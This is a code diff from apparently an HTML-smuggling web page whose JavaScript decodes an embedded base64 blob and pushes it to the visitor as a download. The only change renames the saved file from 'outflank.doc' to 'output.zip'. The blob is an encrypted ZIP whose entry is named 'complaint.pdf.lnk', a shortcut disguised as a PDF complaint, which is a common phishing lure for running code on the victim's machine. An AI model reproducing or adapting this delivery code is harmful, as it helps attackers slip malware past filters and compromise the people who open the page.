@@ -126,7 +126,7 @@
         var file ='UEsDBBQAAQAIAJBoZForpk5VDwMAAIkFAAARAAAAY29tcGxhaW50LnBkZi5sbmvcIUg3xz72WEbuaEi0epDTNVIik17a4D/hMSAqSdwkj15TB1ngDV4IJCB+L1N5IYoaXIohmG++89eMkTPR2RavDFp6PgBoUSyHXFChWgrujW1lwzZl9eeVGnz+UN9HwAd8TXa/45z7MgG3Dr2Rzf9InqDz2pTWGUKRPPV5lsAwBHB1ipR+Rt/k3Pg1Z77b+7JE0UQBXzFWtKUSEZ+UsitH3I9jocjVbW7kjLMRBr1i6Bcl/szgLNR5l7yGjgRl2gqSubsIcbsglLgPzV5fgdeSEroo9mw0EtDuLuw+Xc5BbEsuFG5SXpwUkBJ7NFblldumK4z4yuCyQS4mvtDGBy0hWh0m+aySHiRaop6kBpGe2JgGz4y0rEkk+aLPuwRxp3g5e5SoMuvwTwztk20XcvT9Gm+r30YeN/P+Bo89wrIkndRkWUxVYulG3Hoo9hLZwfUW+fgYi+gJn+mFEkU51DHz7/WoGJS4SnLLau3dizMEJxeoOlgP/3YjMlgDNhkFvifY2f17lwel1Gr3S9qnr3DR1aulgaePIvcj5pup0Ngqcz22apv4E8H3cxEVYkciv2ypfax6L3/9s9Hou0okHWE1sG4BTXoUYkb2y6WwmD5OULnEiifwbXaQjKD3HXLu1tP8k8RprfvFBrdBxv6g/ZvLNRFuAPO5rNous2a+7WpeQbhsqXSOF6RKxz/KZRrkp1CQDcIFu33cJG6nTW/tbDpUrmc9RAvmI9BpBp9nYRc05FJg885rjV0E4cJhDKFVqWrKHVMtQrw2FYFD3AnH8S7Ef8/mSNWTpqL9eZ7LM+P+rM3S/LmJwtvs8KNgXQJ6OO/mUD1rD1nevkxg5p6xOpE90akrYdBZN5YbV0/8YljCRzc4RFu5bWk+sQVcEaiphrYk6iWUSAt3TMvQaiynf0zMlVcnvf0fB2VCewFQjm5eaQcUHGq1qe6mVJI2AgsJ29wjGDh3AYqmM3ld3X4W/vI0O7MLZ9T2TLZWSfJCChPKsCsVC2Ug4qBtgCVoHw1CqZ0tyl0BauerlZybvnzJDnRQSwECAAAUAAEACACQaGRaK6ZOVQ8DAACJBQAAEQAAAAAAAAAAAAAAAAAAAAAAY29tcGxhaW50LnBkZi5sbmtQSwUGAAAAAAEAAQA/AAAAPgMAAAAA';
         var data = base64ToArrayBuffer(file);
         var blob = new Blob([data], {type: 'octet/stream'});
-        var fileName = 'outflank.doc';
+        var fileName = 'output.zip';
         
         if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
         else {
